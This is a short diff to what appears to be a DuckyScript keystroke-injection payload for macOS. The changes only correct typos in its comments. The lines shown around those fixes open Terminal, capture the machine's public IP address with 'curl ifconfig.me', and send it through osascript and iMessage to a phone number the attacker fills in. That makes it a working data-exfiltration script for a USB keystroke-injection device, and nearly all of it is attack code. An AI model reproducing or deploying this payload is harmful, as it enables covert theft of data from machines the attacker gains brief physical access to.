@@ -13,12 +13,12 @@ STRING Terminal
 DELAY 200
 ENTER
 DELAY 200
-REM Change this command inside the brackets too any command that outputs text to the terminal
+REM Change this command inside the brackets to any command that outputs text to the terminal
 STRING x=$(curl ifconfig.me)
 DELAY 200
 ENTER
 DELAY 200
-REM Replace PHONE_NUMBER with you iMessage supported number (leave the @'s, they are required to run)
+REM Replace PHONE_NUMBER with your iMessage supported number (leave the @'s, they are required to run)
 STRING osascript -e 'tell application @Messages@ to send @'$x'@ to buddy @PHONE_NUMBER@'
 DELAY 100
 ENTER
